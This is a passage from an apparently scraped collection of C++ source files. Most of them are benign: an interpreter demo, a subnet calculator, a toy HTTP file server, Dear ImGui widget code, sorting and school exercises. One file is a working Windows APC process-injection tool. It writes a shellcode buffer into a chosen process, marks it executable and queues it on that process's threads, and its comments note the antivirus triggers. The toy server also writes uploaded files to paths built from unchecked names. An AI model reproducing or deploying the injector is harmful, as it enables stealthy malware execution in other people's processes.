endorsing the frame has two layers: outer, which uses symbols and inner, which uses atoms\n//   - at first glance, symbolic language constructed in this demonstrator may look like Forth, but it is not.\n//     it is not structured. it has numerals but no literals. it has no flow control. it is not Turing-complete. it is not recursive.\n//     it reflects C++ functions, by declarations. consider it rather imperative command language, like JCL or Unix shells. this is by design.\n//   - we call specific execution model represented by constructed interpreter a Frame Machine\n// Frame-related primitives may be global/external functions or functions templates, operating on frame or independently callable \n//    this is demonstrated by process control and RPN arithmetic mechanic on frame's data stack container\n// Alternatively, a frame may provide its own primitive methods \n//    this is demonstrated by boolean flag indicator which is an embedded part of frame\n// Very large frames could provide their own exposed primitives vocabulary suitable for frame composition\n//    this is not demonstrated here yet\n// Generally we combine operators on frame and operators on structures embedded in frame into one symbolic language\n//    finally, a simple console is implemented for play with the frame. This makes whole contraption looking like an interpreter\n\nclass FRAME {\npublic:\n  std::stack<int> data_stack; // forth-like RPN arithmetic data stack\n  // in c++ standard, std::stack is an adapter to std::deque, which is (by standard) already a tree, for adequate complexity.\n  // therefore, we recommend using deque for more advanced structured frames.\n\n  int base = 10; // numeric base setter. stores an integer. this is a kludge for ye olde compiler\n  // std::ios_base& base (std::ios_base&) = std::ios_base::dec; // iomanip base setter. stores a value for ostream manipulator\n\nprivate:  \n  bool flag; // some fancy indicator which just demonstrates a hidden part of this frame, accessible by tokens only\n  // such kind of frame augmenting can be done to any c++ object, turning it into a scriptable machine\n\npublic:  // expose indicator flag manipulators, as usual in getters/setters common pattern\n  void _FLAG_SET (void);\n  void _FLAG_RESET (void);\n  void _FLAG_QUERY (void);\n  void _FLAG_STORE (void);\n  \n} frame; // let's have one\n\n// implementations of exposed member functions\nvoid FRAME::_FLAG_SET (void) { flag = true; };\nvoid FRAME::_FLAG_RESET (void) { flag = false; };\nvoid FRAME::_FLAG_QUERY (void) { data_stack.push(flag); };\nvoid FRAME::_FLAG_STORE (void) {\n    if (data_stack.empty()) {    \n      std::cerr << \"Warning: missing value, flag set operation ignored by frame\" << std::endl;\n      return;\n    }\n    flag = data_stack.top();\n    data_stack.pop();\n};\n\n// atoms.\n// some naive atoms for defined primitives, applicable to that frame\n// atoms are acting radicals, represented as integers in all internal mechanics. may evolve into typed cells in far future\n// atoms are not part of frame definition because in other complex execution model\n// there may be more frames present accessible to common outer language, sharing atoms logically\n// in project, atoms will become employed in prasers, combined, functional programming or/and logical programming execution models of advanced frames. this is by design\n// in procedural programming execution model (which is demonstrated here by this frame), atoms serve as opcodes to primitives\n// our long term goal of the project is to fuse procedural, functional and logical programming paradigms into one hybrid execution model \n\n// our atoms here are simple enum, because in this toy they are static. dynamic atoms creation (by jit compilers for example)\n// and frame composition shall require some better organized integers (like, atomspace arrays or intervals)\ntypedef enum {\n  // magical atom\n  UNDEFINED = 0,\n  // platform process control\n  HELLO, EXIT, ABORT, HELP, QUIT,\n  // arithmetic constants\n  ZERO, ONE, TWO, THREE, \n  //",
    "#include <iostream>\r\n#include <string>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\nstring findWhat;//quiz1, quiz2\r\nstring ip4, findClass;\r\nstring subnetMask ,firstAvailableHostAddressofSubnet1, MaxNOfhostsSubnet;\r\nstring findSM, partOfSM;\r\nstring slash, NA, BA;\r\nint first, second, third, fourth;\r\nlong long subnetsRequired, n, ipSize, cntOf255, hostLeft, availableHosts, range;\r\nint afterSlash, bit, period, forSubnett;\r\nint networkAddress, x;\r\n\r\nstring nTimesOne(int n) {\r\n    int zerosLeft = 8 - n;\r\n    string ans = \"\";\r\n    while(n > 0) {\r\n        ans += \"1\";\r\n        n--;\r\n    }\r\n\r\n    while (zerosLeft > 0) {\r\n        ans += \"0\";\r\n        zerosLeft--;\r\n    }\r\n\r\n    return ans;\r\n}\r\n\r\nstring binToDec(string s) {\r\n    int k, x, ans = 0, i;\r\n    string stAns = \"\";\r\n        k = s.size();\r\n        x = k - 1;\r\n        for(i = 0; i < k; i++) {\r\n            ans += (s[i]-48) * pow(2,x);\r\n            x--;\r\n        }\r\n\r\n        stAns = to_string(ans);\r\n\r\n        return stAns;\r\n}\r\n\r\n\r\nint main() {\r\n    cout << \"Subnetting Quiz1 : quiz1 \\nSubnetting Quiz2 : quiz2 \\n\";\r\n\r\n    cin >> findWhat;\r\n\r\n    if(findWhat == \"quiz1\") {\r\n        cout << \"Insert IPv4 address: \";\r\n        cin >> ip4;\r\n\r\n        cout << \"Insert Subnets required: \";\r\n        cin >> subnetsRequired;\r\n\r\n        n = log2(subnetsRequired);\r\n\r\n        if(pow(2,n) < subnetsRequired) n++;\r\n\r\n        cout << endl << endl << \"n-times one for S/M: \" << n << endl;\r\n        hostLeft = 8 - n;\r\n        cout << \"n-times zero for Hosts: \" << hostLeft << endl;\r\n        //octets\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (k < ipSize) {\r\n            fourth = fourth * 10 + ip4[k]-48;\r\n            k++;\r\n        }\r\n\r\n        cout << \"Network: \" << first << '.' << second << '.' << third << '.' << fourth << endl;\r\n        //find class    A B C\r\n\r\n        if(first > 0 && first < 127) {\r\n            // cout << \"Class: A\\n\";\r\n            cntOf255 = 1; \r\n            findClass = \"A\";\r\n        }\r\n        else if(first > 127 && first < 192) {\r\n            // cout << \"Class: B\\n\"; \r\n            cntOf255 = 2; \r\n            findClass = \"B\";\r\n        }\r\n        else {\r\n            // cout << \"Class: C\\n\"; \r\n            cntOf255 = 3; findClass = \"C\";\r\n        }\r\n\r\n        k = 4;//for S/M, if cntOf255=3 then there is one zero left, so k should be equal to 4 for while loop\r\n        k -= cntOf255;\r\n\r\n        while (cntOf255 > 0) {\r\n            subnetMask += \"255.\";\r\n            cntOf255--;\r\n        }\r\n\r\n        findSM = nTimesOne(n);\r\n        // cout << \"FORSUBNETTTTT: \" << findSM << endl;\r\n        partOfSM = binToDec(findSM);\r\n        // cout << partOfSM << endl;\r\n        subnetMask += partOfSM + \".\";\r\n\r\n        k--;\r\n        while (k > 0) {\r\n            subnetMask += \"0.\";\r\n            k--;\r\n        }\r\n\r\n        subnetMask = subnetMask.substr(0, subnetMask.size() - 1);//silamazistvis\r\n        cout << \"\\n\\n\\t Subnet Mask: \" << subnetMask << endl;\r\n\r\n        //first available host\r\n        range = pow(2,hostLeft);\r\n\r\n        if(findClass == \"A\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(range) + \".\" + to_string(third) + \".\" + to_string(fourth+1);\r\n        } else if(findClass == \"B\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(range) + \".\" + to_string(fourth+1);\r\n        } else {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(third) + \".\" + to_string(range+1);\r\n        }\r\n        \r\n        cout << \"\\t 1st Available Host Address of Subnet 1: \" << firstAvailableHostAddressofSubnet1 << endl;\r\n\r\n        //number of hosts\r\n        if(findClass == \"A\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256 * 256;\r\n        }else if(findClass == \"B\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256;\r\n        } else {\r\n            availableHosts = 256 - stoi(partOfSM);\r\n        }\r\n\r\n        availableHosts -= 2;    MaxNOfhostsSubnet = to_string(availableHosts);\r\n        cout << \"\\t Max # of hosts/subnet: \" << MaxNOfhostsSubnet << endl;\r\n\r\n    } else {\r\n\r\n        cout << \"Insert IPv4 Address with it's mask (/24): \";\r\n        cin >> ip4 >> slash;\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n     ",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <cstring>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <vector>\n#include <thread>\n#include <fstream>\n#include <sstream>\n\nstd::string captureAfterKey(const std::string& input) {\n    std::size_t echoPos = input.find(\"/echo/\");\n    if (echoPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 /echo/\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u4ece /echo/ \u540e\u9762\u5f00\u59cb\u67e5\u627e\u7a7a\u683c\n    std::size_t spacePos = input.find(' ', echoPos + 6); // /echo/ \u957f\u5ea6\u4e3a6\n    if (spacePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u7a7a\u683c\uff0c\u53d6\u4ece /echo/ \u540e\u9762\u5230\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u90e8\u5206\n        return input.substr(echoPos + 6);\n    } else {\n        // \u5982\u679c\u627e\u5230\u4e86\u7a7a\u683c\uff0c\u53d6\u7a7a\u683c\u524d\u7684\u90e8\u5206\n        return input.substr(echoPos + 6, spacePos - echoPos - 6);\n    }\n}\n\nstd::string extractUserAgent(const std::string& request) {\n    std::size_t userAgentPos = request.find(\"User-Agent: \");\n    if (userAgentPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 User-Agent \u5934\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u627e\u5230 User-Agent \u5934\uff0c\u73b0\u5728\u627e\u5230\u8be5\u884c\u7684\u7ed3\u675f\u4f4d\u7f6e\n    std::size_t endOfLinePos = request.find(\"\\r\\n\", userAgentPos);\n    if (endOfLinePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u884c\u7ed3\u675f\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n    return request.substr(userAgentPos + sizeof(\"User-Agent: \") - 1, endOfLinePos - userAgentPos - sizeof(\"User-Agent: \") + 1);\n}\n\n\nint matchPath(const char *keyword[], int keywordSize, const std::string& path) {\n    for (int i = 0; i < keywordSize; ++i) {\n        if (std::strcmp(keyword[i], path.c_str()) == 0) {\n            return 1; // \u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 1\n        }\n    }\n    return 0; // \u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 0\n}\n\nint matchEcho(const std::string& path, const std::vector<std::string>& array) {\n    for (const auto& str : array) {\n        if (path.find(str) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& filePath) {\n    std::ifstream fileStream(filePath, std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content;\n        content.resize(size);\n        if (size > 0) {\n            fileStream.read(&content[0], size);\n        }\n        return content;\n    } else {\n        return \"\";\n    }\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& directory, const std::string& filename) {\n    std::ifstream fileStream((directory + \"/\" + filename).c_str(), std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());\n        return content;\n    } else {\n        return \"\";\n    }\n}\nstd::string handlePostRequest(const std::string& request, const std::string& directory) {\n    std::string response;\n    std::string filename;\n    std::string fileContent;\n\n    // \u67e5\u627e POST \u8bf7\u6c42\u6b63\u6587\u7684\u5f00\u59cb\n    size_t postHeaderEnd = request.find(\"\\r\\n\\r\\n\") + 4;\n    if (postHeaderEnd != std::string::npos) {\n        // \u83b7\u53d6 POST \u8bf7\u6c42\u6b63\u6587\u5185\u5bb9\n        fileContent = request.substr(postHeaderEnd);\n\n        // \u63d0\u53d6\u6587\u4ef6\u540d\uff0c\u5047\u8bbe\u5b83\u7d27\u8ddf\u5728 \"POST /files/\" \u4e4b\u540e\n        size_t filenameStart = request.find(\"POST /files/\") + 11;\n        size_t filenameEnd = request.find(\" \", filenameStart); // \u5047\u8bbe\u6587\u4ef6\u540d\u4e4b\u540e\u6709\u4e00\u4e2a\u7a7a\u683c\n        if (filenameEnd != std::string::npos) {\n            filename = request.substr(filenameStart, filenameEnd - filenameStart);\n\n            // \u6784\u9020\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\n            std::string filePath = directory + \"/\" + filename;\n\n            // \u4fdd\u5b58\u6587\u4ef6\n            std::ofstream outFile(filePath, std::ios::binary);\n            if (outFile) {\n                outFile << fileContent;\n                response = \"HTTP/1.1 201 Created\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            } else {\n                response = \"HTTP/1.1 500 Internal Server Error\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            }\n        } else {\n            response = \"HTTP/1.1 400 Bad Request: Invalid filename\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n        }\n    } else {\n        response = \"HTTP/1.1 400 Bad Request: Invalid POST request format\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n    }\n\n    return response;\n}\n// \u65b0\u5efa\u51fd\u6570 processRequest \u6765\u5904\u7406\u8bf7\u6c42\nstd::string processRequest(const std::string& request, const std::string& directory, const std::vector<std::string>& keyword) {\n    std::string report;\n    size_t start_pos = request.find(\" \");\n    size_t end_pos = request.find(\" \", start_pos + 1);\n    \n    if (start_pos != std::string::npos && end_pos != std::string::npos) {\n        std::string method = request.substr(0, start_pos);\n        std::string path = request.substr(start_pos + 1, end_pos - start_pos - 1);\n        std::cout << \"Received path: \" << path << std::endl;\n        \n        // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n        std::st",
    "// dear imgui, v1.90.1 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"",
    "//\ufd3e\u0625\u0650\u0646\u0651\u064e\u0645\u064e\u0627 \u064a\u064e\u062e\u0652\u0634\u064e\u0649 \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0645\u0650\u0646\u0652 \u0639\u0650\u0628\u064e\u0627\u062f\u0650\u0647\u0650 \u0627\u0644\u0652\u0639\u064f\u0644\u064e\u0645\u064e\u0627\u0621\u064f \u0625\u0650\u0646\u0651\u064e \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0639\u064e\u0632\u0650\u064a\u0632\u064c \u063a\u064e\u0641\u064f\u0648\u0631\u064c\ufd3f\n#include <bits/stdc++.h>\n#define int long long\n//#define endl \"\\n \"\n#include <random>\nusing namespace std;\n/*\n<-----Complexity Analysis----->\n-Space Complexity: O(1)\n-Time Complexity: O(N^2) as there are two nested loops:\n\nOne loop to select an element of Array one by one = O(N)\nAnother loop to compare that element with every other Array element = O(N)\nSo, overall complexity = O(N) * O(N) = O(N*N) = O(N^2)\n*/\nvoid selectionSort(int arr[], int n){\n    int key = 0, j = 0 , min_idx;\n    for (int i = 0; i < n - 1; i++) {\n        min_idx = i;\n      // Search the minimum element in unsorted array\n        for (j = i + 1; j < n; j++) {\n            if (arr[j] < arr[min_idx]){\n                min_idx = j;\n            }\n        }\n      // Swap the minimum element with the first element\n        if(min_idx != i){   // For Stable Sort\n            swap(arr[min_idx], arr[i]);\n        }\n    }\n}\n\nvoid printArray(int arr[], int size)\n{\n    int i;\n    for (i = 0; i < size; i++) {\n        cout << arr[i] << \" \";\n    }\n  cout << endl;\n}\n\n\nsigned main() {\nint arr[3] = {3 ,1 ,2};\n    selectionSort(arr,sizeof(arr)/sizeof(arr[0]));\n    printArray(arr,sizeof(arr)/sizeof(arr[0]));\n}\n",
    "#include <iostream>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include <string>\r\n using namespace std;\r\n  int main(){\r\n  \t\r\n  \t  system(\"COLOR 2\");\r\n  \t  \r\n  \t  cout<<\"SISTEM PENENTU KENAIKAN SISWA\"<<endl;\r\n  \t   for (int j = 0; j < 3; j++) {\r\n  \t   \t cout<<\".\";\r\n  \t   \t sleep(1);\r\n\t\t }\r\n  \t  \r\n\t\tint kkm;\r\n  \t  cout<<\"\\n mohon masukan nilai kkm = \"<<endl;\r\n  \t  cin>> kkm;\r\n  \t  \r\n  \t  \r\n  \t  for (int b = 0; b < 4; b++) {\r\n\t\t\r\n  \t  cout<<\".\";\r\n  \t  sleep(1);\r\n  \t  \r\n  }\r\n  \r\n  \t  \r\n  \t  string nama;\r\n  \t  cout<<\"\\n masukan nama siswa = \"<<endl;\r\n  \t  cin>> nama;\r\n  \t  \r\n  \t  int nilai;\r\n  \t  while (true) {\r\n  \t  cout<<\"masukan nilai siswa = \"<<endl;\r\n  \t  cin>> nilai;\r\n  \t  \r\n  \t cout<<\"menentukan........\\n\"<<endl;\r\n  \t for (int i = 0; i < 5; i++) {\r\n    cout << \".\";\r\n    Sleep(200);\r\n    }\r\n    \r\n    \r\n    if ( nilai >= kkm) {\r\n    \tcout<< nama << \" SELAMAT DI NYATAKAN NAIK KELAS!!\"<<endl;\r\n    \t\r\n\t}\r\n\t  else if ( nilai == kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN NAIK  KELAS!!\"<<endl;\r\n\t  \tcout<< \"anda berada di kkm pas. terus belajar!!\"<<endl;\r\n\t  }\r\n\t  \r\n\t  else if ( nilai != kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN TINNGAL KELAS!!\"<<endl;\r\n\t  \tcout<< \" belajar yang rajin :)\"<<endl;\r\n    }\r\n\t   else  {\r\n\t   \tcout<<\"EROR 455 RETRY AGAIN\"<<endl;\r\n\t   }\r\n\t  \r\n\t  sleep(10);\r\n\t  system(\"CLS\");\r\n\t  \r\n\t  cout<<\"\\nSoftware ini di buat oleh CaitroniaDev. Free open-scoure 2024\"<<endl;\r\n\t  \r\n\t  return 0;\r\n  }\r\n}\r\n",
    "#include\"Variant.hpp\"\n#include\"Logger.hpp\"\n#include\"variant_to_string.hpp\"\n#include\"FunctionMacro.hpp\"\n\nFunction_Begin(get_type_name,String const)\nParameter(Variant,any)\n    if(any.is_null()){\n        return \"null\";\n    }else if(any.is_boolean()){\n        return \"boolean\";\n    }else if(any.is_number()){\n        return \"number\";\n    }else if(any.is_string()){\n        return \"string\";\n    }else if(any.is_array()){\n        return \"array\";\n    }else if(any.is_object()){\n        return \"object\";\n    }else if(any.is_function()){\n        return \"function\";\n    }\n    return \"undefined\";\nFunction_End\n\nauto lambda_get_type_name=\n    Lambda_Begin(String const)\n    Parameter(Variant const,any)\n        return ::get_type_name(any);\n    Lambda_End;\n\nint main(int argc,char* argv[]){\n    static_assert(sizeof(Variant)<=sizeof(void*));\n    Variant variant=Object{\n        {\"null\",Null{}},\n        {\"boolean\",true},\n        {\"integer\",-1},\n        {\"float\",3.14},\n        {\"character\",'A'},\n        {\"string\",\"hello\"},\n        {\"array\",\n            Array{\n                Null{},false,1,-3.14,'B',\"world\",\n                Array{1,2},Object{{\"name\",\"Tom\"},{\"age\",20}},\n                Lambda_Begin(Null)\n                Parameter(Number const,num1)\n                Parameter(Number const,num2)\n                    ::std::cout<<num1<<num2<<\"\\n\";\n                Lambda_End\n            },\n        },\n        {\"set_value\",\n            Lambda_Begin(Null,&variant)\n            Parameter(String const,name)\n            Parameter(Number const,age)\n                variant.object()[\"name\"]=name;\n                variant.object()[\"age\"]=age;\n            Lambda_End\n        }\n    };\n    variant.object()[\"set_value\"].function().Invoke(\"Jerry\",114514);\n    Logger::info(variant_to_string(variant));\n    BoxManager<typename Variant::value_type>::print_object_pool();\n    BoxManager<typename Variant::value_type>::print_memory_pool();\n    return 0;\n}",
    "#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcID);\n\nint main()\n{\n\tDWORD dwProcList[1024];\n\tDWORD dwBytesWritten;\n\tDWORD dwOldProtect = 0;\n\tHANDLE hProc;\n\tSIZE_T bytesWritten;\n\tint PID, counter = 0;\n\tchar cProcName[100];\n\tunsigned char shellcode[] = \"\";\n\n\tprintf(\"Type PID: \");\n\tscanf_s(\"%d\", &PID);\n    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);\n\n    while(counter < (dwBytesWritten / 4)) {\n\t\thProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);\n        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {\n\t\t\tif (dwProcList[counter] == PID) {\n\t\t\t\tprintf(\"PROCCESS NAME - %s\\n\", cProcName);\n\t\t\t\tLPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);\n\t\t\t\tWriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);\n\t\t\t\tVirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);\n\t\t\t\tRunAPC(pVirtualMem,dwProcList[counter]);\n\t\t\t}\n            CloseHandle(hProc);\n        }\n\t\tcounter++;\n    }\n}\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcId) {\n\tTHREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV\n\n\tif (hSnapshot == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"Error Openning the function\");\n\t\tCloseHandle(hSnapshot);\n\t}\n\n\tfor (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {\n\t\tif (thEntry.th32OwnerProcessID == iProcId) {\n\t\t\tHANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);\n\t\t\tprintf(\"PROC [%d] ThreadID: %d\\n\", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);\n\t\t\tQueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);\n\t\t}\n\t}\n\tCloseHandle(hSnapshot);\n}\n",
    "#include \"compiler.hpp\"\n#include \"assembler.hpp\"\n#include \"mysimpletron.hpp\"\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\n//x = 1000 in the input.txt file.......\n//if you change the constant make sure its not in three digits only two digits......\n\n\n\nint main() {\n    std::ifstream inputFile(\"input.txt\");\n    std::ofstream assemblyFile(\"assembly.txt\", std::ios::out | std::ios::trunc);\n    std::ofstream machineCodeFile(\"machine_code.txt\", std::ios::out | std::ios::trunc);\n\n    if (!inputFile.is_open()) {\n        std::cerr << \"Error opening input file.\\n\";\n        return 1;\n    }\n\n    // Read entire input file into a string\n    std::string code((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());\n    inputFile.close();\n\n    Compiler compiler;\n    Assembler assembler;\n\n    // Compile the code into initial assembly\n    auto assembly = compiler.compile(code);\n\n    // Write the updated assembly code to a file\n    for (const auto& line : assembly) {\n        assemblyFile << line << std::endl;\n    }\n    assemblyFile.close();\n\n    // Assemble the updated assembly into machine code\n    auto machineCode = assembler.assemble(assembly);\n\n    // Write machine code to a file\n    for (const auto& line : machineCode) {\n        machineCodeFile << line << std::endl;\n    }\n    machineCodeFile.close();\n\n    // Open machine code file for execution\n    std::ifstream machineCodeInput(\"machine_code.txt\");\n    if (!machineCodeInput.is_open()) {\n        std::cerr << \"Error opening machine code file.\\n\";\n        return 1;\n    }\n\n    // Read the machine code from the file\n    Simpletron simpletron(100);\n    std::vector<int> program;\n    std::string machineLine;\n    while (getline(machineCodeInput, machineLine)) {\n        if (!machineLine.empty()) {\n            program.push_back(std::stoi(machineLine));\n        }\n    }\n    machineCodeInput.close();\n\n    // Load and execute the updated machine code in the Simpletron\n    simpletron.load_program(program);\n    simpletron.execute();\n\n    // Optionally, dump the final state of the Simpletron\n    simpletron.dump();\n\n    return 0;\n}\n",
